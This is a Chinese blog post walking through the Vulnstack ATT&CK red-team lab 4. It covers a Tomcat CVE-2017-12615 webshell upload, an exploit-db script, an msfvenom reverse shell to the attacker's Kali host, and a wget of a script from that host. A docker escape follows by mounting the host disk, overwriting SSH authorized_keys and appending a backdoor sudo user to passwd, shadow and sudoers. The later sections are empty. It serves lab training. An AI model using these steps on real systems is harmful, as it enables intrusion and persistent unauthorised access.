<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="前言Vulnstack是红日安全团队出品的一个实战环境，本次测试的红日安全 ATT&amp;CK实战系列——红队评估（四）靶场环境，下载地址：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;6&#x2F;  环境搭建网络拓扑如下：  IP如下： 1234kali linux  192.168.150.141web(ubuntu) 192.168.150.160(">
<meta property="og:type" content="article">
<meta property="og:title" content="ATT&amp;CK实战系列一">
<meta property="og:url" content="http://140.143.122.13/posts/16266.html">
<meta property="og:site_name" content="忆时光">
<meta property="og:description" content="前言Vulnstack是红日安全团队出品的一个实战环境，本次测试的红日安全 ATT&amp;CK实战系列——红队评估（四）靶场环境，下载地址：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;6&#x2F;  环境搭建网络拓扑如下：  IP如下： 1234kali linux  192.168.150.141web(ubuntu) 192.168.150.160(">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://140.143.122.13/posts/16266/attck413.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/14/ATT-CK-2.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/14/ATT-CK-1006440fbf2833079.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/14/attck4-3.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/14/attck4-4.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/14/attck45.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/15/attck47.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/15/attck48.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/15/attck49.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/15/attck410.png">
<meta property="og:image" content="http://140.143.122.13/posts/16266/attck411.png">
<meta property="og:image" content="http://140.143.122.13/posts/16266/attck412.png">
<meta property="og:image" content="http://140.143.122.13/posts/16266/attck413.png">
<meta property="og:image" content="http://140.143.122.13/posts/16266/attck414.png">
<meta property="og:image" content="http://140.143.122.13/posts/16266/attck415.png">
<meta property="og:image" content="http://140.143.122.13/posts/16266/attck416.png">
<meta property="og:image" content="http://140.143.122.13/posts/16266/attck417.png">
<meta property="og:image" content="http://140.143.122.13/posts/16266/attck418.png">
<meta property="og:image" content="http://140.143.122.13/posts/16266/attck419.png">
<meta property="og:image" content="http://140.143.122.13/posts/16266/attck420.png">
<meta property="og:image" content="http://140.143.122.13/posts/16266/attck421.png">
<meta property="og:image" content="http://140.143.122.13/posts/16266/attck422.png">
<meta property="og:image" content="http://140.143.122.13/posts/16266/attck423.png">
<meta property="article:published_time" content="2020-05-14T07:24:32.000Z">
<meta property="article:modified_time" content="2020-05-15T07:41:12.330Z">
<meta property="article:author" content="ca5tle">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://140.143.122.13/posts/16266/attck413.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>ATT&amp;CK实战系列一</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="忆时光" type="application/atom+xml" />
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://www.sectime.top:8888" target="_blank" rel="noopener">Img</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/posts/51461.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/posts/36799.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://140.143.122.13/posts/16266.html" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://140.143.122.13/posts/16266.html&text=ATT&amp;CK实战系列一" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://140.143.122.13/posts/16266.html&title=ATT&amp;CK实战系列一" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://140.143.122.13/posts/16266.html&is_video=false&description=ATT&amp;CK实战系列一" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ATT&amp;CK实战系列一&body=Check out this article: http://140.143.122.13/posts/16266.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://140.143.122.13/posts/16266.html&title=ATT&amp;CK实战系列一" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://140.143.122.13/posts/16266.html&title=ATT&amp;CK实战系列一" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://140.143.122.13/posts/16266.html&title=ATT&amp;CK实战系列一" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://140.143.122.13/posts/16266.html&title=ATT&amp;CK实战系列一" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://140.143.122.13/posts/16266.html&name=ATT&amp;CK实战系列一&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://140.143.122.13/posts/16266.html&t=ATT&amp;CK实战系列一" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">3.</span> <span class="toc-text">get shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用msf"><span class="toc-number">3.1.</span> <span class="toc-text">使用msf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker逃逸"><span class="toc-number">4.</span> <span class="toc-text">docker逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#横向移动"><span class="toc-number">5.</span> <span class="toc-text">横向移动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#拿下域控"><span class="toc-number">6.</span> <span class="toc-text">拿下域控</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        ATT&amp;CK实战系列一
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">ca5tle</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-05-14T07:24:32.000Z" itemprop="datePublished">2020-05-14</time>
        
        (Updated: <time datetime="2020-05-15T07:41:12.330Z" itemprop="dateModified">2020-05-15</time>)
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Vulnstack是红日安全团队出品的一个实战环境，本次测试的红日安全 ATT&amp;CK实战系列——红队评估（四）靶场环境，下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p>
<p><img src="/posts/16266/attck413.png" alt></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>网络拓扑如下：</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/14/ATT-CK-2.png" alt="ATT-CK-2.png"></p>
<p>IP如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali linux  192.168.150.141</span><br><span class="line">web(ubuntu) 192.168.150.160(外) 192.168.183.128(内)</span><br><span class="line">win7        192.168.183.129</span><br><span class="line">DC(win2008) 192.168.183.130</span><br></pre></td></tr></table></figure>

<p>进入<code>WEB</code>主机，需要手动使用<code>docker</code>开启服务，分别是<code>strtus2-045</code>、<code>cve-2017-12615</code>、<code>cve-2018-12613</code><br>使用<code>docker</code>需要使用<code>sudo</code>否则没有权限使用，开启后情况如下</p>
<h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><p>我们先用<code>nmap</code>扫一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -oA nmap&#x2F;vulnstack4 192.168.150.160</span><br></pre></td></tr></table></figure>

<p>扫描结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;nmap# nmap -sC -sV -oA nmap&#x2F;vulnstack4 192.168.150.160</span><br><span class="line">Failed to open normal output file nmap&#x2F;vulnstack4.nmap for writing</span><br><span class="line">QUITTING!</span><br><span class="line">root@kali:~&#x2F;nmap# cd ..</span><br><span class="line">root@kali:~# nmap -sC -sV -oA nmap&#x2F;vulnstack4 192.168.150.160</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-05-15 09:40 CST</span><br><span class="line">Nmap scan report for 192.168.150.160</span><br><span class="line">Host is up (0.00035s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 6d:1e:e7:55:ee:d7:2b:22:d7:6b:68:67:df:39:f5:7b (DSA)</span><br><span class="line">|   2048 5e:ca:2c:70:8f:a2:0c:bf:10:d7:26:2b:15:5f:3f:58 (RSA)</span><br><span class="line">|   256 de:b5:6a:a8:24:6a:13:45:cc:87:21:c3:c2:ee:b2:10 (ECDSA)</span><br><span class="line">|_  256 8e:02:ca:99:6e:c2:eb:8f:0c:5c:bb:c9:b2:f5:06:4d (ED25519)</span><br><span class="line">2002&#x2F;tcp open  http    Apache Tomcat 8.5.19</span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">|_http-title: Apache Tomcat&#x2F;8.5.19</span><br><span class="line">MAC Address: 00:0C:29:57:73:39 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.40 seconds</span><br></pre></td></tr></table></figure>

<p>访问<code>http://192.168.150.160:2002/</code>发现是<code>Tomcat</code></p>
<p><img src="http://www.sectime.top:8888/images/2020/05/14/ATT-CK-1006440fbf2833079.png" alt="Tomcat"></p>
<p>利用<code>CVE-2017-12615</code>直接<code>put</code>一个冰蝎马上去</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/14/attck4-3.png" alt="attck4-3.png"></p>
<p>这里有几点需要<strong>注意</strong>的：</p>
<ol>
<li>将<code>GET</code>请求改为<code>PUT</code></li>
<li>上传<code>shell</code>的名称后面需要加上<code>/</code>，比如，<code>/shell.jsp/</code></li>
<li>在最后加上要上传的内容，即shell</li>
</ol>
<p>访问<code>http://192.168.150.160:2002/shell.jsp</code>，<code>shell</code>已经成功上传</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/14/attck4-4.png" alt="attck4-4.png"></p>
<p>使用冰蝎成功连接，是<code>root</code>权限</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/14/attck45.png" alt="attck45.png"></p>
<h3 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用msf</h3><p>首先搜索一下<code>apache tomcat</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit apache tomcat</span><br><span class="line">-------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                              |  Path</span><br><span class="line">                                                                                            | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)</span><br><span class="line">-------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">AWStats 6.x - Apache Tomcat Configuration File Arbitrary Command Execution                  | exploits&#x2F;cgi&#x2F;webapps&#x2F;35035.txt</span><br><span class="line">Apache 1.3.x + Tomcat 4.0.x&#x2F;4.1.x mod_jk - Chunked Encoding Denial of Service               | exploits&#x2F;unix&#x2F;dos&#x2F;22068.pl</span><br><span class="line">Apache Commons FileUpload and Apache Tomcat - Denial of Service                             | exploits&#x2F;multiple&#x2F;dos&#x2F;31615.rb</span><br><span class="line">Apache Tomcat (Windows) - &#39;runtime.getRuntime().exec()&#39; Local Privilege Escalation          | exploits&#x2F;windows&#x2F;local&#x2F;7264.txt</span><br><span class="line">......</span><br><span class="line">Apache Tomcat &lt; 6.0.18 - &#39;utf8&#39; Directory Traversal                                         | exploits&#x2F;unix&#x2F;remote&#x2F;14489.c</span><br><span class="line">Apache Tomcat &lt; 6.0.18 - &#39;utf8&#39; Directory Traversal (PoC)                                   | exploits&#x2F;multiple&#x2F;remote&#x2F;6229.txt</span><br><span class="line">Apache Tomcat &lt; 9.0.1 (Beta) &#x2F; &lt; 8.5.23 &#x2F; &lt; 8.0.47 &#x2F; &lt; 7.0.8 - JSP Upload Bypass &#x2F; Remote C | exploits&#x2F;jsp&#x2F;webapps&#x2F;42966.py</span><br><span class="line">Apache Tomcat &lt; 9.0.1 (Beta) &#x2F; &lt; 8.5.23 &#x2F; &lt; 8.0.47 &#x2F; &lt; 7.0.8 - JSP Upload Bypass &#x2F; Remote C | exploits&#x2F;windows&#x2F;webapps&#x2F;42953.txt</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>

<p><img src="http://www.sectime.top:8888/images/2020/05/15/attck47.png" alt="attck47.png"></p>
<p>找到一个可用的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Tomcat &lt; 9.0.1 (Beta) &#x2F; &lt; 8.5.23 &#x2F; &lt; 8.0.47 &#x2F; &lt; 7.0.8 - JSP Upload Bypass &#x2F; Remote C | exploits&#x2F;jsp&#x2F;webapps&#x2F;42966.py</span><br></pre></td></tr></table></figure>

<p>将payload复制到当前目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit -m exploits&#x2F;jsp&#x2F;webapps&#x2F;42966.py</span><br><span class="line">  Exploit: Apache Tomcat &lt; 9.0.1 (Beta) &#x2F; &lt; 8.5.23 &#x2F; &lt; 8.0.47 &#x2F; &lt; 7.0.8 - JSP Upload Bypass &#x2F; Remote Code Execution (2)</span><br><span class="line">      URL: https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;42966</span><br><span class="line">     Path: &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;jsp&#x2F;webapps&#x2F;42966.py</span><br><span class="line">File Type: Python script, ASCII text executable, with CRLF line terminators</span><br><span class="line"></span><br><span class="line">Copied to: &#x2F;root&#x2F;42966.py</span><br></pre></td></tr></table></figure>

<p>然后可以使用<code>42966.py</code>脚本</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/15/attck48.png" alt="attck48.png"></p>
<p>用<code>-u</code>参数检测是否存在漏洞</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/15/attck49.png" alt="attck49.png"></p>
<p>存在漏洞，访问<code>http://192.168.150.160:2002/Poc.jsp</code>看一下</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/15/attck410.png" alt="attck410.png"></p>
<p>我们就用自带的工具利用漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 42966.py -u http:&#x2F;&#x2F;192.168.150.160:2002&#x2F; -p pwn</span><br></pre></td></tr></table></figure>

<p><img src="/posts/16266/attck411.png" alt></p>
<p>可看到成功了，并返回一个shell</p>
<p>然后我们去访问上传的<code>pwn.jsp</code></p>
<p><img src="/posts/16266/attck412.png" alt></p>
<p>在输入框中可执行命令</p>
<h2 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h2><p>参考：<a href="https://daolgts.github.io/2019/10/07/docker安全/" target="_blank" rel="noopener">docker安全</a></p>
<p>使用<code>cve-2019-5736</code>实现<code>docker</code>逃逸  <a href="https://github.com/Frichetten/CVE-2019-5736-PoC" target="_blank" rel="noopener">EXP</a></p>
<p>下载后编辑<code>main.go</code>，将命令改为如下反弹<code>shell</code>命令</p>
<p>6</p>
<p>使用<code>go</code>语言编译，得到<code>main</code>文件</p>
<p>通过冰蝎上传<code>main</code>文件，一执行就卡死，于是反弹<code>shell</code>到<code>kali</code><br>使用冰蝎反弹<code>shell</code>到<code>msf</code>，反弹<code>meterpreter</code>发现进不了<code>shell</code>也无法执行文件，直接反弹<code>shell</code>不能接收</p>
<p>于是使用另外的方式反弹<code>shell</code>，首先使用<code>msf</code>生成一个反弹<code>shell</code>的后门</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;192.168.150.141 LPORT&#x3D;5555 -f raw &gt; shell1.jsp</span><br></pre></td></tr></table></figure>

<p>然后将它通过冰蝎上传到网站根目录<code>/usr/local/tomcat/webapps/ROOT/</code>，执行成功反弹<code>shell</code>，然后运行<code>main</code></p>
<p>输入框中执行<code>ls /dev</code>，可以看到docker虚拟的硬盘</p>
<p><img src="/posts/16266/attck413.png" alt></p>
<p>我们试一下挂载</p>
<p>在根目录创建一个<code>test</code>文件夹，<code>mkdir /test</code></p>
<p><code>mount /dev/sda1 /test</code>，看一下是否挂载成功，<code>ls /test</code></p>
<p><img src="/posts/16266/attck414.png" alt></p>
<p>挂载成功</p>
<p>我们查看一下<code>/home</code></p>
<p><img src="/posts/16266/attck415.png" alt></p>
<p>查看隐藏文件，<code>ls -lah /test/home/ubuntu</code>，可以看到<code>.ssh</code></p>
<p><img src="/posts/16266/attck416.png" alt></p>
<p>查看<code>.ssh</code></p>
<p><img src="/posts/16266/attck417.png" alt></p>
<p>接下来我们就利用ssh实现docker逃逸</p>
<p><code>ssh-keygen -f kali</code>生成私钥</p>
<p><img src="/posts/16266/attck418.png" alt></p>
<p><code>chmod 600 kali</code>，不然用不了</p>
<p>这里我们写一个<code>test.sh</code>脚本，方便执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp -avx &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">echo &gt; &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDl13XtnQ&#x2F;CEiD7SZLBXR8sbpEb7aXb3CMMpCZabybfg1eXitxiT+V7ypF1v8yjlRVGk7LqVeCD1nGI5d&#x2F;VaDSW3fqe6fxZBH+8nAuuWbt6oEdkndaDuPgSHBZSkGJDQsePq9WOQ1tNUx7v2Jg7pMuIdd9kTQOVgK4xL2KGxddTwmpJCkv1gNn6Vd99ASWLIRKPNYdLvQ4lGAn6gPz39LBfDXaU8ri93HA75IIzz+7nXETfkx6x82vr0GuEmJBmqRRHxAQo8zAl3XC+X&#x2F;tkPrSCr4OH26Rt3dQ9EL+eJJI8hSpWxGfC2uvauFQ8Brx+SuSnUAO9RevbAUyQDXyuI8LXu3vJL2Grw2tb9FDsIAEHtHUZ8o4od6xhyWThiv2hrL8nKHXzpuypTZ6WCznP6inYaCOFpChtU01kHptmzBreNy33HveKxMjKd5338dB4zSaIaaNqPKizjoejk7oRBJkuGyqecrwL3ReToj+FM02QnjK1kESpEspMTuOF5m6vwL0&#x3D; kali@kali&#39; &gt; &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">cat &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure>

<p>保存，开启一个http服务，在目标下载</p>
<p><code>python -m SimpleHTTPServer</code></p>
<p>在输入框下载</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.150.141:8000&#x2F;test.sh</span><br></pre></td></tr></table></figure>

<p><code>chmod 777 test.sh</code> ，<code>ls -la</code>看一下</p>
<p><img src="/posts/16266/attck419.png" alt></p>
<p>执行<code>test.sh</code>，<code>bash test.sh</code>，成功</p>
<p><img src="/posts/16266/attck420.png" alt></p>
<p>在<code>kali</code>上用<code>ssh</code>连接一下，并没有什么用，因为我们不知道密码。。。。</p>
<p><img src="/posts/16266/attck421.png" alt></p>
<p>那么我们该怎么办呢？可以添加用户，但不能在输入框中添加，否则添加用户到了<code>docker</code></p>
<p>这里我们可以修改配置文件也可以添加用户</p>
<p>写个脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 &#x2F;test&#x2F;etc&#x2F;passwd</span><br><span class="line">chmod 777 &#x2F;test&#x2F;etc&#x2F;shadow</span><br><span class="line">chmod 777 &#x2F;test&#x2F;etc&#x2F;sudoers</span><br><span class="line">mkdir &#x2F;test&#x2F;home&#x2F;kali</span><br><span class="line">chmod 777 &#x2F;test&#x2F;home&#x2F;kali</span><br><span class="line">echo &#39;kali:x:1001:1000:kali,,,:&#x2F;home&#x2F;kali:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;test&#x2F;etc&#x2F;passwd</span><br><span class="line">echo &#39;kali:$6$dZhS1PQKuhRB3dMq$GVQsHMiD7221rqrnfxGxP6X9Pn271DJ2N299OHzWPoR6SmSQnk7mSK96BP9ZETvqkfFs1HFbMWkxD9kCSX10H1:18397:0:99999:7:::&#39; &gt;&gt; &#x2F;test&#x2F;etc&#x2F;shadow</span><br><span class="line">echo &#39;kali  ALL&#x3D;(ALL:ALL)  ALL&#39; &gt;&gt; &#x2F;test&#x2F;etc&#x2F;sudoers</span><br><span class="line">cat &#x2F;test&#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure>

<p>输入框下载，<code>chomd 777 adduser.sh</code>，执行<code>bash adduser.sh</code></p>
<p><img src="/posts/16266/attck422.png" alt></p>
<p>在<code>kali</code>上登录</p>
<p><img src="/posts/16266/attck423.png" alt></p>
<p>这里需要注意几点：</p>
<ol>
<li><code>ssh -i kali ubuntu@192.168.150.160</code>必须在<code>kali</code>上的<code>kali</code>用户下执行</li>
<li><code>sudoers</code>文件的权限只能是只读，上面我们改成<code>777</code>，需要把它改成<code>440</code></li>
<li><code>sudo -s</code>提升权限到<code>root</code></li>
</ol>
<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h2 id="拿下域控"><a href="#拿下域控" class="headerlink" title="拿下域控"></a>拿下域控</h2>
  </div>
</article>


    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
    <div id="vcomments" class="blog-post-comments"></div>
    <script>
        new Valine({
            el: '#vcomments',
            visitor: true,
            appId: 'euAQjqlW2tS4fVHxsmyLkdLj-gzGzoHsz',
            appKey: 'Fmn6CIIN9yyDif6AC2hxSglA',
            placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
            avatar: 'robohash'
        })
    </script>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://www.sectime.top:8888" target="_blank" rel="noopener">Img</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">3.</span> <span class="toc-text">get shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用msf"><span class="toc-number">3.1.</span> <span class="toc-text">使用msf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker逃逸"><span class="toc-number">4.</span> <span class="toc-text">docker逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#横向移动"><span class="toc-number">5.</span> <span class="toc-text">横向移动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#拿下域控"><span class="toc-number">6.</span> <span class="toc-text">拿下域控</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
